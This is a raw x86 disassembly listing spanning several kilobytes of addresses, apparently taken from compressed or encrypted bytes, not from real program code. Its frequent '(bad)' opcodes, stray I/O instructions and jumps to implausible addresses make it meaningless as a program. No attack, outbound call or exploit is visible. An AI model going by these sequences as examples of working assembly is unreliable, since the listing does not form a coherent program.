  41047b:	aam    0xe3
  41047d:	adc    eax,0x5b6ae940
  410482:	mov    BYTE PTR [eax+edx*2],bh
  410485:	das    
  410486:	fistp  WORD PTR [ebp+0x34]
  410489:	fiadd  WORD PTR [eax]
  41048b:	xchg   ecx,eax
	...
  4104a4:	add    BYTE PTR [esi],bl
  4104a6:	je     0x4104a6
  4104a8:	add    BYTE PTR [ebp-0x63c35b21],cl
  4104ae:	pop    es
  4104af:	mov    BYTE PTR [ebx],al
  4104b1:	add    bh,BYTE PTR [eax]
  4104b3:	or     BYTE PTR [eax],al
  4104b5:	lea    eax,[eax+0x4a4a0479]
  4104bb:	or     ah,BYTE PTR [eax]
  4104bd:	pop    ebp
  4104be:	pop    es
  4104bf:	add    BYTE PTR [ebp-0x17afe6e2],cl
  4104c5:	cdq    
  4104c6:	out    0xfd,al
  4104c8:	jmp    esi
  4104ca:	inc    esp
  4104cb:	fimul  WORD PTR [ecx+0x458b2d1e]
  4104d1:	popa   
  4104d2:	add    BYTE PTR [ecx+0x40],0xa0
  4104d6:	mov    ah,0xe0
  4104d8:	cld    
  4104d9:	shr    dh,cl
  4104db:	out    0x21,al
  4104dd:	cmp    DWORD PTR [edi],eax
  4104df:	add    BYTE PTR [eax-0x4b],dl
  4104e2:	leave  
  4104e3:	arpl   WORD PTR [eax],ax
  4104e5:	or     eax,0xd01ecb0
  4104ea:	pop    es
  4104eb:	mov    eax,esi
  4104ed:	fild   DWORD PTR [edi]
  4104ef:	add    BYTE PTR [eax+0x54],al
  4104f2:	je     0x4104eb
  4104f4:	(bad)  
  4104f5:	cwde   
  4104f6:	xlat   BYTE PTR ds:[ebx]
  4104f7:	cld    
  4104f8:	call   edx
  4104fa:	jae    0x4104fa
  4104fc:	(bad)  
  4104fd:	fld    QWORD PTR [ebx+0x7d0e8bd5]
  410503:	adc    eax,0xfffffff3
  410506:	out    dx,al
  410507:	std    
  410508:	call   0x41050d
	...
  410521:	add    BYTE PTR [ecx+0x4b],ah
  410524:	(bad)  
  410525:	call   FWORD PTR [ebx]
  410527:	inc    ebp
  410528:	or     eax,0xfa655e01
  41052d:	add    BYTE PTR [esi+0x75],dl
  410530:	push   es
  410531:	call   FWORD PTR [ebx]
  410533:	add    DWORD PTR [edx+0x0],ebp
  410536:	shl    BYTE PTR [edi+0x2],cl
  410539:	push   esp
  41053b:	jo     0x41050f
  41053d:	adc    eax,0xc3835c34
  410542:	call   0xb3fda59
  410547:	push   0x52381477
  41054c:	ret    0x76ff
  41054f:	test   al,0x7
  410551:	sub    DWORD PTR [ecx],0xffffffa8
  410554:	js     0x410540
  410556:	push   es
  410557:	dec    edi
  410558:	inc    edx
  410559:	aas    
  41055a:	aaa    
  41055b:	out    0xde,eax
  41055d:	out    0x3a,eax
  41055f:	sub    DWORD PTR [ecx],ecx
  410561:	add    BYTE PTR [edi+0x39],dh
  410564:	js     0x410564
  410566:	jg     0x410579
  410568:	pop    esp
  410569:	push   edx
  41056a:	pop    esp
  41056b:	mov    edi,0xe5f400b4
  410570:	mov    esi,0x9fb34c0e
  410575:	add    esp,esi
  410577:	sbb    eax,0xe6c1000c
  41057c:	adc    BYTE PTR [bx+si],0x8c
  410580:	(bad)  
  410581:	call   FWORD PTR [ebx]
  410583:	xchg   edx,eax
  410584:	iret   
  410585:	mov    WORD PTR [eax],es
	...
  41059f:	push   ecx
  4105a0:	mov    WORD PTR [esi+edi*8+0xb],?
  4105a4:	(bad)  
  4105a5:	(bad)  
  4105a6:	push   ds
  4105a7:	neg    BYTE PTR [ebx-0x75]
  4105aa:	mov    ah,0xb0
  4105ac:	sub    DWORD PTR [ecx-0x2],edi
  4105af:	pop    esp
  4105b0:	int3   
  4105b1:	(bad)  
  4105b2:	(bad)  
  4105b3:	jmp    0x41059b
  4105b5:	inc    eax
  4105b6:	imul   esi,esp,0x441477ab
  4105bc:	push   edx
  4105bd:	ret    0x76ff
  4105c0:	daa    
  4105c1:	or     BYTE PTR [ebp-0x76fb1051],al
  4105c7:	pop    es
  4105c8:	scas   eax,DWORD PTR es:[edi]
  4105c9:	inc    edx
  4105ca:	test   dl,al
  4105cc:	add    al,0x46
  4105ce:	or     DWORD PTR [eax-0x49b4c1bc],ecx
  4105d4:	fmul   QWORD PTR [ebx+eax*1]
  4105d7:	hlt    
  4105d8:	add    al,0x41
  4105da:	fs and dh,al
  4105dd:	call   0xeaebc34d
  4105e2:	add    eax,edi
  4105e4:	dec    ebp
  4105e5:	pop    edi
  4105e6:	(bad)  
  4105e7:	mov    ds:0x2b50237f,eax
  4105ec:	jb     0x4105e9
  4105ee:	add    eax,DWORD PTR [edi]
  4105f0:	(bad)
  4105f3:	push   0x17
  4105f5:	cmp    eax,0x6004b415
  4105fa:	mov    esi,0x8aa2d3f
  4105ff:	js     0x410615
  410601:	call   0x410609
	...
  41061a:	add    BYTE PTR [eax],al
  41061c:	hlt    
  41061d:	sub    edx,DWORD PTR [eax+edx*2]
  410620:	shr    DWORD PTR [edi],0x62
  410623:	mov    esi,0x9c1c7d1f
  410628:	js     0x4106a4
  41062a:	aam    0x2b
  41062c:	sahf   
  41062d:	push   es
  41062e:	ror    ebx,0xa7
  410631:	(bad)  
  410632:	call   0x85582108
  410637:	adc    al,0xb4
  410639:	add    al,0x64
  41063b:	inc    ebx
  41063c:	sbb    BYTE PTR [edx],0x64
  41063f:	shl    edi,1
  410641:	jg     0x4105ee
  410643:	pop    ebx
  410644:	adc    ebx,DWORD PTR [edx-0x760bfc15]
  41064a:	sub    dh,ch
  41064c:	bnd jnp 0x4105fa
  41064f:	pop    ebx
  410650:	js     0x410697
  410652:	xchg   ebx,eax
  410653:	or     esi,DWORD PTR [edi]
  410655:	sub    al,0xa4
  410657:	dec    edi
  410658:	dec    edi
  410659:	cmp    eax,0xca7d0411
  41065e:	dec    DWORD PTR [eax]
  410660:	cmp    al,0xf9
  410662:	fucomi st,st(6)
  410664:	jmp    0xf86a17e5
  410669:	cmp    DWORD PTR [ecx+ecx*8-0x10],0xffffffff
  41066e:	adc    DWORD PTR [edx+0x6a0004f8],0xffffff9d
  410675:	push   eax
  410676:	(bad)  
  410677:	not    BYTE PTR [ebx]
  410679:	mov    ch,0xff
  41067b:	call   0xd940b577
	...
  410698:	add    bh,dh
  41069a:	add    al,0x56
  41069c:	shl    DWORD PTR [edx-0x4a],0x0
  4106a0:	jmp    0x1cc97f23
  4106a5:	enter  0xfe88,0xe6
  4106a9:	jecxz  0x410637
  4106ab:	(bad)  
  4106ac:	call   0xe9aadda8
  4106b1:	pop    ebp
  4106b2:	jo     0x41071c
  4106b4:	in     eax,0x2e
  4106b6:	sar    esi,cl
  4106b8:	cld    
  4106b9:	xlat   BYTE PTR ds:[ebx]
  4106ba:	outs   dx,BYTE PTR ds:[esi]
  4106bb:	adc    al,0x51
  4106bd:	out    0xc4,al
  4106bf:	jmp    FWORD PTR [edi+0x35]
  4106c2:	dec    esp
  4106c3:	test   BYTE PTR [ecx],ch
  4106c5:	and    al,0xc6
  4106c7:	or     ah,0xab
  4106ca:	outs   dx,DWORD PTR ds:[esi]
  4106cb:	push   esp
  4106cc:	mov    ecx,0xb5146f2a
  4106d1:	add    ebp,eax
  4106d3:	jmp    FWORD PTR [ecx-0x4c]
  4106d6:	sti    
  4106d7:	mov    BYTE PTR [esp+ebp*4+0x71],dl
  4106db:	(bad)  
  4106dc:	outs   dx,DWORD PTR cs:[esi]
  4106de:	pop    edx
  4106df:	mov    dh,BYTE PTR [esi]
  4106e1:	jge    0x41066b
  4106e3:	retf   
  4106e4:	pop    ds
  4106e5:	arpl   WORD PTR [edi-0x19],bp
  4106e8:	in     al,0xb6
  4106ea:	outs   dx,DWORD PTR ds:[esi]
  4106eb:	(bad)  
  4106ec:	push   0xffffffad
  4106ee:	imul   edi,esi,0x0
  4106f1:	out    0x6,al
  4106f3:	xor    eax,eax
  4106f5:	popf   
  4106f6:	ret    0x6589
  4106f9:	cmc    
  4106fa:	or     DWORD PTR [ebx-0x4],0x0
	...
  410716:	retf   0x7b7a
  410719:	fcomp  DWORD PTR [edx-0x5f00258c]
  41071f:	jg     0x410731
  410721:	inc    eax
  410722:	lea    ebp,[ebx+0x38d082e]
  410728:	cmp    DWORD PTR [edi-0x5f],eax
  41072b:	pop    edi
  41072c:	or     edx,DWORD PTR [edi+0x6]
  41072f:	dec    ebp
  410730:	push   es
  410731:	call   0x410b19
  410736:	pop    ss
  410737:	int3   
  410738:	jmp    0xfd81344d
  41073d:	jne    0x4107a4
  41073f:	not    BYTE PTR [ebx]
  410741:	dec    esp
  410742:	arpl   WORD PTR [ebx-0x2],ax
  410745:	adc    BYTE PTR [ecx-0xdfe4cf9],0xe0
  41074c:	daa    
  41074d:	mov    dl,0x5c
  41074f:	add    eax,DWORD PTR [ebx+ebx*8+0x75fefc41]
  410756:	ins    DWORD PTR es:[edi],dx
  410757:	not    BYTE PTR [ebx]
  410759:	add    al,0x2e
  41075b:	inc    ebx
  41075c:	(bad)  
  41075d:	scas   eax,DWORD PTR es:[edi]
  41075e:	sbb    al,0xda
  410760:	add    BYTE PTR [edx],dh
  410762:	int    0xdb
  410764:	retf   
  410765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410766:	lsl    eax,dx
  410769:	add    al,0x1d
  41076b:	ss mov al,0x46
  41076e:	test   DWORD PTR [ecx+0x49b22bc1],ecx
  410774:	aaa    
  410775:	stos   BYTE PTR es:[edi],al
  410776:	push   ss
  410777:	xor    BYTE PTR [ebp-0x3],ch
	...
  410792:	add    ch,dl
  410794:	mov    ecx,0x6cbafeb0
  410799:	scas   al,BYTE PTR es:[edi]
  41079a:	push   ebx
  41079b:	hlt    
  41079c:	cli    
  41079d:	xor    al,ch
  41079f:	inc    ecx
  4107a0:	sbb    BYTE PTR [ebp-0x6],ah
  4107a3:	mov    bl,0x78
  4107a5:	(bad)  
  4107a7:	aaa    
  4107a8:	ins    BYTE PTR es:[edi],dx
  4107a9:	out    0x3a,eax
  4107ab:	mov    fs,ebx
  4107ad:	or     eax,0xe6de8f33
  4107b2:	mov    bh,0xc9
  4107b4:	pop    edi
  4107b5:	enter  0x584c,0xf4
  4107b9:	push   cs
  4107ba:	aaa    
  4107bb:	outs   dx,BYTE PTR ds:[esi]
  4107bc:	aam    0x86
  4107be:	scas   eax,DWORD PTR es:[edi]
  4107bf:	mov    DWORD PTR [edi],edx
  4107c1:	gs cli 
  4107c3:	mov    dl,0x78
  4107c5:	cmp    ah,al
  4107c7:	dec    ebx
  4107c8:	cmp    ebx,0x7a
  4107cb:	dec    esi
  4107cc:	fsub   QWORD PTR [esi]
  4107ce:	jnp    0x41079b
  4107d0:	mov    ds:0x8b1d3515,al
  4107d5:	mov    cs,WORD PTR [esi-0x69]
  4107d8:	std    
  4107d9:	mov    gs,WORD PTR [edx-0x37]
  4107dc:	jne    0x4107ca
  4107de:	daa    
  4107df:	dec    esi
  4107e0:	arpl   WORD PTR [ecx-0x35],sp
  4107e3:	sbb    ecx,DWORD PTR [edi]
  4107e5:	(bad)  
  4107e6:	jp     0x41079e
  4107e8:	ins    DWORD PTR es:[edi],dx
  4107e9:	or     bh,BYTE PTR [ebx]
  4107eb:	mov    ?,ebp
  4107ed:	cmc    
  4107ee:	mov    ch,0xa
  4107f0:	scas   eax,DWORD PTR es:[edi]
  4107f1:	mov    dh,0x39
  4107f3:	pop    esi
  4107f4:	jae    0x41082e
  4107f6:	or     BYTE PTR [eax],al
	...
  410810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410811:	inc    ebx
  410812:	pop    ebx
  410813:	dec    esi
  410814:	jb     0x41081d
  410816:	imul   esi,edx,0xffffffc1
  410819:	mov    edx,0x735fac06
  41081e:	dec    esi
  41081f:	mov    edx,0xbde8b380
  410824:	mov    ?,WORD PTR [eax+0x6f0ab5f0]
  41082a:	lock push 0xfffffff0
  41082d:	add    al,0x1d
  41082f:	push   ss
  410830:	or     esi,DWORD PTR [ebx-0x65442ef7]
  410836:	loope  0x41089c
  410838:	fisub  WORD PTR [edi-0x240b5592]
  41083e:	xchg   al,ah
  410840:	fwait
  410841:	data16 int 0xf9
  410844:	sti    
  410845:	fiadd  DWORD PTR [ebx-0x61da02a0]
  41084b:	lds    ebp,FWORD PTR [esi]
  41084d:	imul   ecx,ecx,0xffffffce
  410850:	dec    edx
  410851:	fwait
  410852:	icebp  
  410853:	add    ebx,esi
  410855:	xlat   BYTE PTR ds:[ebx]
  410856:	push   ebp
  410857:	(bad)  
  410858:	retf   0x1e25
  41085b:	mov    BYTE PTR [esi],0x6b
  41085e:	leave  
  41085f:	in     al,0x8c
  410861:	call   0x50d5:0x4d7e65f1
  410868:	mov    al,ds:0xa9e9e199
  41086d:	pop    esi
  41086e:	aad    0x29
  410870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410871:	mov    dl,0x31
  410873:	and    DWORD PTR [eax],eax
	...
  41088d:	mov    dl,0xd4
  41088f:	mov    ah,BYTE PTR ds:0x5c94d730
  410895:	sar    BYTE PTR [esi-0x1f],cl
  410898:	cmp    ecx,ebx
  41089a:	ret    0x3566
  41089d:	call   FWORD PTR [edx-0x5355569b]
  4108a3:	and    ax,0xab13
  4108a7:	shr    DWORD PTR [eax+0x2f],0xf6
  4108ab:	bnd jmp 0x81f4788f
  4108b1:	es or  eax,0xc878e9e3
  4108b7:	bnd jmp 0x25a7798b
  4108bd:	jecxz  0x41091d
  4108bf:	call   DWORD PTR [ecx-0x5eb86e0b]
  4108c5:	fisttp QWORD PTR [eax-0x42]
  4108c8:	scas   al,BYTE PTR es:[edi]
  4108c9:	jecxz  0x4108ba
  4108cb:	test   eax,0x27339971
  4108d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d1:	mov    cl,0xef
  4108d3:	and    edx,edi
  4108d5:	sbb    eax,0x2cf8def2
  4108da:	cs cmc 
  4108dc:	xchg   esp,eax
  4108dd:	push   es
  4108de:	mov    ch,0x4e
  4108e0:	lahf   
  4108e1:	xor    eax,0x7c940008
  4108e6:	pusha  
  4108e7:	adc    ch,0x54
  4108ea:	ins    BYTE PTR es:[edi],dx
  4108eb:	(bad)  
  4108ec:	jmp    0x4397dbbb
	...
  410909:	add    ah,dh
  41090b:	jns    0x410951
  41090d:	mov    cl,0xb0
  41090f:	aam    0xdd
  410911:	sub    dh,al
  410913:	aaa    
  410914:	fstp   TBYTE PTR [edi-0x8]
  410917:	adc    al,0x0
  410919:	jmp    0xb19d86c5
  41091e:	icebp  
  41091f:	lock sti 
  410921:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410922:	or     eax,0xf82915b9
  410927:	xchg   ebx,eax
  410929:	in     eax,0x42
  41092b:	rcl    BYTE PTR [edx+0x1],cl
  41092e:	cld    
  41092f:	add    al,0x0
  410931:	icebp  
  410932:	je     0x4108f5
  410934:	xlat   BYTE PTR ds:[ebx]
  410935:	sbb    DWORD PTR [edx],esp
  410937:	imul   eax,esi,0x2c
  41093a:	rol    BYTE PTR [eax+eax*1],1
  41093d:	jmp    0x75557539
  410942:	add    al,ch
  410944:	push   DWORD PTR [ecx-0x70]
  410947:	jl     0x4109c5
  410949:	pop    ebp
  41094a:	retf   
  41094b:	outs   dx,DWORD PTR ds:[esi]
  41094c:	jae    0x410940
  41094e:	sub    eax,0x270052d7
  410953:	(bad)  
  410954:	push   esi
  410955:	jmp    FWORD PTR [eax]
  410957:	adc    BYTE PTR [eax],0x40
  41095a:	or     eax,0xe6f843e9
  41095f:	ret    0x1973
  410962:	pusha  
  410963:	outs   dx,BYTE PTR ds:[esi]
  410964:	bnd call 0x3ee5ba
  41096a:	push   eax
  41096b:	outs   dx,BYTE PTR ds:[esi]
  41096c:	bnd call 0x410972
	...
  410986:	add    BYTE PTR [eax-0x24],bl
  410989:	std    
  41098a:	dec    DWORD PTR [edi-0x69a1a239]
  410990:	sub    cl,al
  410992:	or     ch,cl
  410994:	lahf   
  410995:	dec    esi
  410996:	je     0x4109f5
  410998:	pop    es
  410999:	cmp    BYTE PTR [ebp-0x5f],bl
  41099c:	ins    BYTE PTR es:[edi],dx
  41099d:	add    edi,DWORD PTR [eax+0x3e6d35]
  4109a3:	fisttp QWORD PTR [edi+0x66]
  4109a6:	pop    esp
  4109a7:	sub    DWORD PTR [ecx-0x2],eax
  4109aa:	push   edx
  4109ab:	add    BYTE PTR [ebp+0x52],bh
  4109ae:	inc    DWORD PTR [edx-0xa]
  4109b1:	dec    esi
  4109b2:	push   0xffffffa3
  4109b4:	cmp    dh,ah
  4109b6:	fs and al,0x2
  4109b9:	add    BYTE PTR [ebx-0x3f7aec67],al
  4109bf:	or     bl,al
  4109c1:	push   0x923cd040
  4109c6:	push   ebx
  4109c7:	or     eax,0x5f9f26c9
  4109cc:	pop    es
  4109cd:	xor    eax,eax
  4109cf:	les    edx,FWORD PTR [edx+eiz*8-0x73]
  4109d3:	inc    eax
  4109d4:	iret   
  4109d5:	test   eax,0xa96b5983
  4109da:	stos   DWORD PTR es:[edi],eax
  4109db:	mov    al,ds:0x9050e23c
  4109e0:	cmp    al,0x8e
  4109e2:	push   eax
  4109e3:	hlt    
  4109e4:	scas   al,BYTE PTR es:[edi]
  4109e5:	aad    0x69
  4109e7:	clc    
  4109e8:	inc    edi
  4109e9:	add    edx,DWORD PTR [ebx+0x0]
	...
  410a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a05:	lock xchg DWORD PTR [ebx+0x3],edx
  410a09:	sub    dh,BYTE PTR [edx+0x4f]
  410a0c:	sti    
  410a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a0e:	cli    
  410a0f:	(bad)  
  410a10:	cmp    esp,ecx
  410a12:	(bad)  
  410a13:	(bad)  
  410a14:	jmp    0x410a72
  410a16:	jno    0x410a2c
  410a18:	test   BYTE PTR [esi-0x3e],ch
  410a1b:	push   DWORD PTR [eax+0x1c]
  410a1e:	clc    
  410a1f:	push   cs
  410a20:	adc    DWORD PTR [ecx+0x6f6e776],0x1f6efe72
  410a2a:	pop    esp
  410a2b:	ja     0x4109e8
  410a2d:	jae    0x410a9f
  410a2f:	(bad)  
  410a30:	sub    DWORD PTR [eax],eax
  410a32:	add    BYTE PTR [eax+eiz*4+0x2c],0x5c
  410a37:	adc    DWORD PTR [edi-0x4b7c8fb5],ebx
  410a3d:	enter  0xff13,0x9
  410a41:	inc    esp
  410a42:	jo     0x410a58
  410a44:	je     0x410a94
  410a46:	ret    0x76ff
  410a49:	inc    esp
  410a4a:	jo     0x410abf
  410a4c:	imul   dh
  410a4e:	add    bh,bh
  410a50:	jmp    0xf0758694
  410a55:	outs   dx,BYTE PTR ds:[esi]
  410a56:	ret    0x62ff
  410a59:	mov    dl,0x70
  410a5b:	je     0x410aa9
  410a5d:	xchg   ebx,eax
  410a5e:	pop    ecx
  410a5f:	jmp    0x317f:0xeb7d3193
  410a66:	cld    
  410a67:	add    BYTE PTR [eax],0x0
	...
  410a7e:	add    BYTE PTR [eax],al
  410a80:	add    BYTE PTR [eax+0x58],dl
  410a83:	add    al,0x0
  410a85:	hlt    
  410a86:	push   cs
  410a87:	ficom  DWORD PTR [esi-0x19]
  410a8a:	fwait
  410a8b:	xor    al,0xf6
  410a8d:	sbb    al,0x5
  410a8f:	xor    al,0x50
  410a91:	and    ebp,DWORD PTR [edx+0x63]
  410a94:	inc    esp
  410a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a96:	push   ds
  410a97:	pop    esi
  410a98:	(bad)  
  410a99:	test   DWORD PTR [ecx+ebp*8],0xd7f0e403
  410aa0:	jl     0x410a9d
  410aa2:	test   DWORD PTR [edi],edi
  410aa4:	and    al,0x86
  410aa6:	(bad)  
  410aa7:	imul   edi,DWORD PTR [edx+0x67],0x1
  410aab:	repnz add DWORD PTR [edx+0x7],esp
  410aaf:	jb     0x410b25
  410ab1:	outs   dx,BYTE PTR ds:[esi]
  410ab2:	mov    bh,0xf0
  410ab4:	pop    ebx
  410ab5:	xchg   edx,eax
  410ab6:	dec    eax
  410ab7:	call   0x938583bf
  410abc:	dec    ebp
  410abd:	jo     0x410b31
  410abf:	jnp    0x410ac8
  410ac1:	push   es
  410ac2:	inc    ebp
  410ac3:	adc    edi,esi
  410ac5:	cmp    ebp,eax
  410ac7:	in     al,0x3
  410ac9:	sub    DWORD PTR [eax],eax
  410acb:	push   0x32
  410acd:	aam    0xf0
  410acf:	xlat   BYTE PTR ds:[ebx]
  410ad0:	jo     0x410afa
  410ad2:	std    
  410ad3:	jno    0x410ac6
  410ad5:	out    dx,eax
  410ad6:	pop    esp
  410ad7:	into   
  410ad8:	dec    edi
  410ad9:	xchg   ebx,eax
  410ada:	imul   esp,DWORD PTR [ecx+0x4b],0x643c4d70
  410ae1:	jo     0x410b62
  410ae3:	shr    BYTE PTR [esi+0x0],0x0
	...
  410afb:	add    BYTE PTR [eax],al
  410afd:	add    BYTE PTR [edx+0x69],bh
  410b00:	sbb    ah,bl
  410b02:	fcomip st,st(0)
  410b04:	sub    BYTE PTR [edx+esi*1],al
  410b07:	mov    edi,0x494c03f5
  410b0c:	jmp    0x410b13
  410b0e:	hlt    
  410b0f:	sub    BYTE PTR [eax+0x39d20af7],0x7f
  410b16:	jo     0x410b84
  410b18:	xor    DWORD PTR [eax+0x42],0xffffffd4
  410b1c:	nop
  410b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b1e:	out    dx,eax
  410b1f:	push   es
  410b20:	add    cl,ch
  410b22:	jnp    0x410acd
  410b24:	jae    0x410aea
  410b26:	jo     0x410b4f
  410b28:	and    dh,dh
  410b2a:	mov    ebp,DWORD PTR [ecx-0x464868f2]
  410b30:	mov    WORD PTR [edi+ebx*4+0x68],gs
  410b34:	dec    BYTE PTR [esi+0x27]
  410b37:	popa   
  410b38:	sub    BYTE PTR [edi-0x7c],al
  410b3b:	push   0xffffff87
  410b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b3e:	hlt    
  410b3f:	ja     0x410ac5
  410b41:	xor    DWORD PTR [edx+0x67],esp
  410b44:	(bad)  
  410b45:	cdq    
  410b46:	dec    edi
  410b47:	fcom   DWORD PTR [edx-0x17]
  410b4a:	not    ebx
  410b4c:	out    0x16,eax
  410b4e:	xchg   ebp,eax
  410b4f:	add    eax,0xf7ba6300
  410b54:	pop    esi
  410b55:	scas   eax,DWORD PTR es:[edi]
  410b56:	mov    eax,0xf7f1c13d
  410b5b:	ror    DWORD PTR [edx-0xca389f3],1
  410b61:	call   0x410b66
	...
  410b7a:	add    bh,dh
  410b7c:	add    al,0x56
  410b7e:	bound  esp,QWORD PTR [edx-0x6987f00]
  410b84:	adc    eax,0xcff7e908
  410b89:	jae    0x410b79
  410b8b:	lds    eax,FWORD PTR [eax+ebp*8+0x4a]
  410b8f:	icebp  
  410b90:	add    al,0x0
  410b92:	xchg   al,cl
  410b94:	cld    
  410b95:	(bad)  
  410b96:	call   0x1a40ea3d
  410b9b:	jecxz  0x410bad
  410b9d:	push   eax
  410b9e:	xlat   BYTE PTR ds:[ebx]
  410b9f:	aaa    
  410ba0:	push   0x7bec2287
  410ba5:	inc    ebp
  410ba6:	lock jbe 0x410bed
  410ba9:	or     esp,DWORD PTR [eax+0x37]
  410bac:	cld    
  410bad:	mov    WORD PTR [edi],fs
  410baf:	cmc    
  410bb0:	aam    0x69
  410bb2:	add    BYTE PTR [eax],ah
  410bb4:	aaa    
  410bb5:	mov    ecx,DWORD PTR [ebx+0x1d]
  410bb8:	jmp    0x410b7f
  410bba:	call   0x407bc6
  410bbf:	xchg   esi,eax
  410bc0:	ds xor eax,0x8b184e89
  410bc6:	inc    esi
  410bc7:	(bad)  
  410bc8:	jmp    0x3ed94c0e
  410bcd:	inc    ebp
  410bce:	push   eax
  410bcf:	aaa    
  410bd0:	sbb    BYTE PTR [edi-0x73],bl
  410bd3:	inc    esi
  410bd4:	test   al,0x89
  410bd6:	(bad)  
  410bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bd8:	xor    eax,0xeadd0177
  410bdd:	test   BYTE PTR [edi+0x0],bh
	...
  410bf7:	add    ch,bl
  410bf9:	add    eax,DWORD PTR [eax]
  410bfb:	mov    ebx,eax
  410bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bfe:	adc    al,0x40
  410c00:	int    0xe8
  410c02:	add    esp,0x6a0003dd
  410c08:	int    0x84
  410c0a:	test   bl,al
  410c0c:	int    0x3
  410c0e:	add    BYTE PTR [eax+0x48],dl
  410c11:	test   dh,al
  410c13:	add    BYTE PTR [ebp+0x2ff5003],bl
  410c19:	test   dl,al
  410c1b:	or     al,0x45
  410c1d:	add    eax,DWORD PTR [ecx]
  410c1f:	add    BYTE PTR [ebp-0x622c7b7c],cl
  410c25:	add    eax,DWORD PTR [eax]
  410c27:	push   eax
  410c28:	sub    BYTE PTR [ebx+0x38d00d6],al
  410c2e:	push   eax
  410c2f:	jmp    DWORD PTR [edx-0x7e]
  410c32:	ret    0xea0c
  410c35:	inc    DWORD PTR [eax]
  410c37:	add    BYTE PTR [ebp-0x80],bl
  410c3a:	(bad)  
  410c3b:	aad    0x4c
  410c3d:	add    eax,DWORD PTR [eax]
  410c3f:	push   esi
  410c40:	enter  0xdaea,0x1
  410c44:	hlt    
  410c45:	pop    ebp
  410c46:	add    cl,BYTE PTR [ebx+0x75678533]
  410c4c:	cmc    
  410c4d:	pop    ebp
  410c4e:	xchg   DWORD PTR [edi-0x12d1f15],edi
  410c54:	xor    ebp,esi
  410c56:	fadd   DWORD PTR [eax]
  410c58:	jns    0x410c8a
  410c5a:	adc    edi,esi
	...
  410c74:	add    BYTE PTR [ebx],ah
  410c76:	ficomp WORD PTR [edx+0x3e]
  410c79:	mov    edx,0x3a8b025d
  410c7e:	lods   eax,DWORD PTR ds:[esi]
  410c7f:	pop    edx
  410c80:	pop    edi
  410c81:	fstp   QWORD PTR [ebx+0x2]
  410c84:	test   BYTE PTR [eax+ebp*4],dh
  410c87:	adc    DWORD PTR [ecx+0x25c0a],edi
  410c8d:	jg     0x410ca5
  410c8f:	inc    ebp
  410c90:	(bad)  
  410c91:	jmp    0x410c2f
  410c93:	mov    ebx,0x2715dd74
  410c98:	(bad)  
  410c99:	fild   DWORD PTR [edi]
  410c9b:	(bad)  
  410c9c:	mov    WORD PTR [ecx],?
  410c9e:	sbb    dl,bl
  410ca0:	mov    WORD PTR [edi-0xbfffdec],es
  410ca6:	xchg   ecx,eax
  410ca7:	add    al,BYTE PTR [ebx-0x42a69854]
  410cad:	xchg   DWORD PTR [ebp+0x2],ebx
  410cb0:	test   DWORD PTR [edi+edx*8+0x5d92b915],esi
  410cb7:	add    al,BYTE PTR [eax]
  410cb9:	imul   esp,ecx,0x4f93fe13
  410cbf:	inc    ebp
  410cc0:	dec    DWORD PTR [ebx+0x7d74bb1c]
  410cc6:	push   ebp
  410cc7:	ja     0x410cc6
  410cc9:	jnp    0x410c72
  410ccb:	js     0x410d11
  410ccd:	push   edx
  410cce:	in     eax,0x80
  410cd0:	pop    es
  410cd1:	repnz pop ebx
  410cd3:	add    ch,BYTE PTR [edx-0x14]
  410cd6:	add    al,0x74
  410cd8:	mov    DWORD PTR [eax],0x0
	...
  410cf2:	inc    ecx
  410cf3:	aad    0x6b
  410cf5:	adc    DWORD PTR [ebx+0x0],0x65a403e9
  410cfc:	repz mov edi,0x80e8c4e9
  410d02:	aaa    
  410d03:	stc    
  410d04:	aas    
  410d05:	pop    esi
  410d06:	hlt    
  410d07:	add    al,0xe9
  410d09:	jle    0x410d7b
  410d0b:	adc    eax,0x3f226d6f
  410d10:	call   0xd3fcc118
  410d15:	push   0x7e
  410d17:	lock loopne 0x410d98
  410d1a:	jno    0x410d7c
  410d1c:	jecxz  0x410d21
  410d1e:	hlt    
  410d1f:	aam    0x73
  410d21:	jns    0x410d0a
  410d23:	(bad)  
  410d24:	call   0x407e8c2c
  410d29:	sub    esp,DWORD PTR [edx+0x4]
  410d2c:	jmp    0x6c36b0b7
  410d31:	test   al,0xd9
  410d33:	gs sbb eax,0xed677979
  410d39:	add    esi,esp
  410d3b:	jnp    0x410da6
  410d3d:	adc    ah,ch
  410d3f:	add    al,0xe9
  410d41:	mov    bl,0xf4
  410d43:	lds    ebx,FWORD PTR [esi-0x16ff4ac6]
  410d49:	xor    BYTE PTR [ecx+ebp*1-0x9f207e7],dh
  410d50:	popf   
  410d51:	stc    
  410d52:	adc    DWORD PTR [edx],ebp
  410d54:	mov    cl,0xf7
	...
  410d6e:	add    BYTE PTR ds:0x767619cf,dl
  410d74:	imul   ebx,DWORD PTR [eax],0xfffffff7
  410d77:	out    0xf5,al
  410d79:	jge    0x410d34
  410d7b:	cmc    
  410d7c:	cmp    DWORD PTR [edi-0x1815],0x74cdde69
  410d86:	in     al,0x3d
  410d88:	add    DWORD PTR [eax-0x16],ebx
  410d8b:	(bad)  
  410d8c:	ror    BYTE PTR [esi],cl
  410d8e:	push   esi
  410d8f:	dec    ebp
  410d90:	js     0x410dea
  410d92:	mov    ecx,0xe0fa8251
  410d97:	dec    eax
  410d98:	std    
  410d99:	add    bh,BYTE PTR [edi-0x46]
  410d9c:	icebp  
  410d9d:	lock cdq 
  410d9f:	int3   
  410da0:	add    eax,0xdf59108d
  410da5:	xor    BYTE PTR [edx-0x6],0xed
  410da9:	pop    es
  410daa:	jmp    0x5ace:0x587378a1
  410db1:	push   cs
  410db2:	fs xchg BYTE PTR ds:[ebp+0x6a],ah
  410db7:	mov    WORD PTR [eax],es
  410db9:	ja     0x410dad
  410dbb:	hlt    
